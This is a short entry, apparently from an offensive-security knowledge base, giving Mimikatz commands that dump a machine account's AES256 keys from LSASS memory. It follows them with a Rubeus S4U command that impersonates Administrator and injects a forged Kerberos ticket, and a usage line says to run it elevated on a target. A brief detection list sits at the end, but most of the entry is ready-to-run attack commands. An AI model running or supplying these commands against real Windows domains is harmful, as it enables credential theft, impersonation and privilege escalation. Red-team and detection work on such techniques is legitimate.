---
id: 6b3a0999-bb6e-480b-9dc9-28f901ec1de1
name: mimikatz-aes-key-extraction-and-rubeus-ticket
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:07.695717+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - keys
validated: true
---

# mimikatz-aes-key-extraction-and-rubeus-ticket

## Code

```cmd
# Get aes256 keys of the machine account
privilege::debug
token::elevate
sekurlsa::ekeys

# Create a ticket
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
```

## Description

Mimikatz commands to extract AES256 keys from LSASS, followed by Rubeus S4U using the key for ticket generation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| AES256 | Extracted key | 4b55f...fd82 |
| USER | Machine account | win10x64$ |
| IMPERSONATEUSER | User | Administrator |
| MSDSSP | SPN | cifs/srv.domain.local |

## Usage

Run elevated on target to forge tickets with extracted keys for delegation exploitation.

## Detection

- Mimikatz modules in memory (sekurlsa).
- Elevated token changes.
- Unusual Kerberos forging events.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Mimikatz]]
